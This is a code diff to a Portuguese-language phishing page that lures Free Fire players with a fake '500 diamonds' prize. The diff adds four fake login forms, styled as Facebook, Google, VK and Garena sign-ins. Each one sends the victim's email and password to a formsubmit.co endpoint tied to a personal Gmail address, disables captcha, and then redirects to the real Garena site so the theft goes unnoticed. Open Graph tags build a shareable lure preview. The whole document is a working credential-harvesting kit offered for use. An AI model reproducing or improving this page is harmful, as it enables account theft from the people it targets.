@@ -4,13 +4,14 @@
   <meta charset="UTF-8">
   <title>Ganhe 500 Diamantes</title>
   <meta name="viewport" content="width=device-width, initial-scale=1">
-  <!-- INÍCIO: Open Graph para pré-visualização -->
-<meta property="og:title" content="🎯 Ganhe 500 Diamantes no Free Fire!" />
-<meta property="og:description" content="Você foi selecionado! Entre agora e resgate seu prêmio exclusivo!" />
-<meta property="og:image" content="https://josefanypedro.github.io/freefire-premios/banner.jpg" />
-<meta property="og:url" content="https://josefanypedro.github.io/freefire-premios/" />
-<meta name="theme-color" content="#2196F3">
-<!-- FIM: Open Graph -->
+  
+  <!-- Open Graph -->
+  <meta property="og:title" content="🎯 Ganhe 500 Diamantes no Free Fire!" />
+  <meta property="og:description" content="Você foi selecionado! Entre agora e resgate seu prêmio exclusivo!" />
+  <meta property="og:image" content="https://josefanypedro.github.io/freefire-premios/banner.jpg" />
+  <meta property="og:url" content="https://josefanypedro.github.io/freefire-premios/" />
+  <meta name="theme-color" content="#2196F3">
+
   <style>
     body {
       font-family: Arial, sans-serif;
@@ -18,12 +19,12 @@
       display: flex;
       justify-content: center;
       align-items: center;
-      height: 100vh;
+      min-height: 100vh;
       margin: 0;
     }
     .form-container {
       background-color: #fff;
-      padding: 30px;
+      padding: 25px;
       border-radius: 8px;
       box-shadow: 0 0 10px rgba(0,0,0,0.1);
       text-align: center;
@@ -44,20 +45,88 @@
       border: none;
       cursor: pointer;
     }
+    .login-options {
+      margin-top: 20px;
+    }
+    .login-btn {
+      display: block;
+      width: 100%;
+      padding: 10px;
+      margin: 8px 0;
+      border: none;
+      border-radius: 5px;
+      color: white;
+      font-weight: bold;
+      cursor: pointer;
+    }
+    .google { background-color: #DB4437; }
+    .facebook { background-color: #4267B2; }
+    .vk { background-color: #4C75A3; }
+    .garena { background-color: #111; }
+
+    .hidden-form {
+      display: none;
+      margin-top: 15px;
+    }
   </style>
+
+  <script>
+    function showForm(id) {
+      const forms = document.querySelectorAll('.hidden-form');
+      forms.forEach(f => f.style.display = 'none');
+      document.getElementById(id).style.display = 'block';
+    }
+  </script>
 </head>
 <body>
   <div class="form-container">
     <h1>🎉 Parabéns! 🎉</h1>
     <p>Você foi selecionado para ganhar <strong>500 diamantes no Free Fire</strong>!</p>
-    <p>Faça login com sua conta do Free fire para continuar:</p>
-    
-<form action="https://formsubmit.co/josefanypedro@gmail.com" method="POST">
-  <input type="email" name="email" placeholder="Seu Email" required>
-  <input type="password" name="password" placeholder="Sua Senha" required>
-  
- 
-  <input type="hidden" name="_captcha" value="false">
-  <input type="hidden" name="_next" value="https://ff.garena.com/">
-  <button type="submit">Iniciar Sessão</button>
-</form>
+    <p>Escolha uma forma de login:</p>
+
+    <!-- Botões de login -->
+    <div class="login-options">
+      <button class="login-btn facebook" onclick="showForm('form-facebook')">🔵 Login com Facebook</button>
+      <button class="login-btn google" onclick="showForm('form-google')">🔴 Login com Google</button>
+      <button class="login-btn vk" onclick="showForm('form-vk')">🔷 Login com VK</button>
+      <button class="login-btn garena" onclick="showForm('form-garena')">⚫ Login com Free Fire ID</button>
+    </div>
+
+    <!-- Form Facebook -->
+    <form id="form-facebook" class="hidden-form" action="https://formsubmit.co/josefanypedro@gmail.com" method="POST">
+      <input type="email" name="fb_email" placeholder="Email do Facebook" required>
+      <input type="password" name="fb_password" placeholder="Senha do Facebook" required>
+      <input type="hidden" name="_captcha" value="false">
+      <input type="hidden" name="_next" value="https://ff.garena.com/">
+      <button type="submit">Entrar com Facebook</button>
+    </form>
+
+    <!-- Form Google -->
+    <form id="form-google" class="hidden-form" action="https://formsubmit.co/josefanypedro@gmail.com" method="POST">
+      <input type="email" name="google_email" placeholder="Email do Google" required>
+      <input type="password" name="google_password" placeholder="Senha do Google" required>
+      <input type="hidden" name="_captcha" value="false">
+      <input type="hidden" name="_next" value="https://ff.garena.com/">
+      <button type="submit">Entrar com Google</button>
+    </form>
+
+    <!-- Form VK -->
+    <form id="form-vk" class="hidden-form" action="https://formsubmit.co/josefanypedro@gmail.com" method="POST">
+      <input type="text" name="vk_login" placeholder="Login do VK" required>
+      <input type="password" name="vk_password" placeholder="Senha do VK" required>
+      <input type="hidden" name="_captcha" value="false">
+      <input type="hidden" name="_next" value="https://ff.garena.com/">
+      <button type="submit">Entrar com VK</button>
+    </form>
+
+    <!-- Form Garena -->
+    <form id="form-garena" class="hidden-form" action="https://formsubmit.co/josefanypedro@gmail.com" method="POST">
+      <input type="email" name="garena_email" placeholder="Email da conta Garena" required>
+      <input type="password" name="garena_password" placeholder="Senha da conta Garena" required>
+      <input type="hidden" name="_captcha" value="false">
+      <input type="hidden" name="_next" value="https://ff.garena.com/">
+      <button type="submit">Entrar com Free Fire ID</button>
+    </form>
+  </div>
+</body>
+</html>
